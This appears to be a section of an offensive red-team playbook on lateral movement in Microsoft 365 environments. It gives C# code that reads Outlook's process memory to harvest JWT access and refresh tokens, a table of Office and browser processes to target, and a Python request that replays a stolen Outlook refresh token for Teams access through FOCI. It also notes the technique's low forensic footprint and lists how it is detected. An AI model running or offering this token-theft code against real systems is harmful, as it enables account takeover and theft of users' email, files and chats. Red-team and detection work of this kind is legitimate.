### Token Extraction from Office Process Memory

This is the most broadly applicable technique in the hybrid lateral movement playbook because it requires only **standard user code execution** on a device — no admin, no LSASS dump, no driver loading. Any user-level process injection or shellcode execution is sufficient.

**The concept:**

Microsoft Office applications (Outlook, Teams, OneDrive, SharePoint), as well as the Microsoft authentication libraries embedded in them, cache access tokens and refresh tokens in process memory. These tokens are used to silently authenticate to Exchange Online, SharePoint, Graph API, and Teams services.

When Outlook.exe has an active Exchange Online session, it holds in its process heap:
- One or more access tokens for `https://outlook.office365.com`
- One or more access tokens for `https://graph.microsoft.com`
- Potentially a FOCI-eligible refresh token that can be used for other Microsoft 365 services

> 📷 *[Insert screenshot: Token extraction from Outlook process memory showing valid JWT]*

**Extraction methodology:**

The tokens are stored by the MSAL (Microsoft Authentication Library) within the process. MSAL's internal token cache is a JSON structure. Within the process memory, searching for JWT patterns (`eyJ`) yields token candidates that can be extracted and validated.

```csharp
// Simplified token extraction concept
// Attach to target process (e.g., OUTLOOK.EXE)
using var process = Process.GetProcessesByName("OUTLOOK")[0];
var handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);

// Scan memory regions for JWT patterns
foreach (var region in GetMemoryRegions(handle)) {
    var buffer = ReadProcessMemory(handle, region.BaseAddress, region.Size);
    // Search for JWT header pattern: eyJ (base64 for {"
    var matches = FindJwtPatterns(buffer);
    foreach (var match in matches) {
        var jwt = ExtractJwtString(buffer, match);
        if (IsValidEntraToken(jwt)) {
            Console.WriteLine($"Found token: {jwt}");
        }
    }
}
```

More sophisticated approaches use the `TokenFinder` tool or custom implementations of MSAL token cache deserialization to extract structured token objects rather than raw JWT strings.

**Targets for token extraction:**

| Process | Tokens Available | Resources Accessible |
|---------|-----------------|---------------------|
| `OUTLOOK.EXE` | Exchange, Graph | Email, Calendar, Contacts, Graph API |
| `Teams.exe` | Teams, Graph, SharePoint | Teams, Files, Calls |
| `OneDrive.exe` | SharePoint, Files | OneDrive, SharePoint |
| `msedge.exe` | Browser session tokens | Any Entra ID SSO resource |
| `chrome.exe` | Browser session tokens | Any Entra ID SSO resource |
| `powershell.exe` | MSAL tokens if Azure PS module active | Azure ARM, Graph |
| `mstsc.exe` | Potentially broker tokens | Azure Virtual Desktop |

**FOCI exploitation:**

Once you have a refresh token from any of these FOCI-eligible apps, you can request access tokens for any other FOCI app without re-authenticating:

```python
# Using roadtx / AADInternals to exploit FOCI token sharing
import requests

# Original refresh token from Outlook memory
outlook_refresh_token = "0.AQEAi..."

# Use it to get a Teams access token
response = requests.post("https://login.microsoftonline.com/common/oauth2/v2.0/token",
    data={
        "grant_type": "refresh_token",
        "refresh_token": outlook_refresh_token,
        "client_id": "1fec8e78-bce4-4aaf-ab1b-5451cc387264",  # Teams client ID
        "scope": "https://api.spaces.skype.com/.default",
    }
)
# Returns a valid Teams access token despite never being a Teams client
```

**Operational notes:** Token extraction from Office process memory leaves minimal forensic artifacts — no new processes, no LSASS access, no driver loads. The primary detection vectors are:
- User-mode hooks in MSAL or Office processes by EDR
- Anomalous memory read patterns (process A reading process B's memory)
- The subsequent use of the extracted tokens from unexpected IP addresses

